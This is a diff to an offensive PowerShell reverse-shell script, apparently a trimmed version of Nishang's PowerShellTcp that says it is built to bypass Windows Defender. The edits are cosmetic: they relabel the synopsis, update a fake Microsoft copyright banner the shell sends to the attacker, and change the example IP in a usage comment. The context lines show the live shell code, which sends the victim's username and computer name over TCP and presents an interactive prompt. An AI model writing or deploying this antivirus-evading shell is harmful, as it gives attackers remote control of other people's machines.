@@ -2,7 +2,7 @@ function RevPShell
 { 
     <#
     .SYNOPSIS
-    Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
+    PowerShell Reverse Shell
 
     .DESCRIPTION
     This script is a light-weight version of the NishangProject PowerShellTcp script desiged to bypass Windows Defender
@@ -47,8 +47,9 @@ function RevPShell
         [byte[]]$bytes = 0..65535|%{0}
 
         #Send back current username and computername
-        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows" + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
+        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows" + $env:username + " on " + $env:computername + "`nCopyright (C) 2020 Microsoft Corporation. All rights reserved.`n`n")
         $stream.Write($sendbytes,0,$sendbytes.Length)
+	
 
         #Show an interactive PowerShell prompt
         $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
@@ -90,7 +91,10 @@ function RevPShell
         Write-Error $_
     }
  # RevPShell -Reverse -IPAddress <IP> -Port <port> 
- # i.e. RevPShell -Reverse 127.0.0.1 -Port 443
+ # i.e. RevPShell -Reverse 127.0.0.2 -Port 443
 }
+
+
+
 
 
